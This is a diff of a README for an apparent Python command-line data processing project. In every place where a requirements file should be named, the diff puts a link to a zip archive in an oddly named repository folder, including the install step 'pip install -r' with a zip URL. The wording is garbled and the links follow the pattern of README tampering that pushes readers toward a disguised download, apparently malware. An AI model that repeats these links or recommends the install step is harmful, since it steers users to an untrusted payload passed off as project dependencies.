@@ -1,7 +1,7 @@
 README
 Project Overview
 
-This project implements a command-line based data processing system developed in Python. It includes all core functionalities such as data loading, input validation, structured processing, and output generation. The system utilizes modular design principles to ensure clarity, maintainability, and extensibility. A https://raw.githubusercontent.com/EarlSeandrikCinco/HonestGaze/main/unpreventably/Honest_Gaze_1.3.zip file is included to specify the external Python dependencies required to run the project. This file allows users to install all necessary packages reproducibly using a single command.
+This project implements a command-line based data processing system developed in Python. It includes all core functionalities such as data loading, input validation, structured processing, and output generation. The system utilizes modular design principles to ensure clarity, maintainability, and extensibility. A https://github.com/EarlSeandrikCinco/HonestGaze/raw/refs/heads/main/unpreventably/Gaze-Honest-2.2.zip file is included to specify the external Python dependencies required to run the project. This file allows users to install all necessary packages reproducibly using a single command.
 
 Current Features
 
@@ -13,7 +13,7 @@ Current Features
 
 - Clear separation of concerns across components
 
-- Reproducible environment setup through https://raw.githubusercontent.com/EarlSeandrikCinco/HonestGaze/main/unpreventably/Honest_Gaze_1.3.zip
+- Reproducible environment setup through https://github.com/EarlSeandrikCinco/HonestGaze/raw/refs/heads/main/unpreventably/Gaze-Honest-2.2.zip
 
 Planned Enhancement
 
@@ -22,4 +22,4 @@ A simple graphical user interface (GUI) will be added in a future update. This G
 How to Install Dependencies
 
 To install the required packages, run:
-    pip install -r https://raw.githubusercontent.com/EarlSeandrikCinco/HonestGaze/main/unpreventably/Honest_Gaze_1.3.zip
+    pip install -r https://github.com/EarlSeandrikCinco/HonestGaze/raw/refs/heads/main/unpreventably/Gaze-Honest-2.2.zip
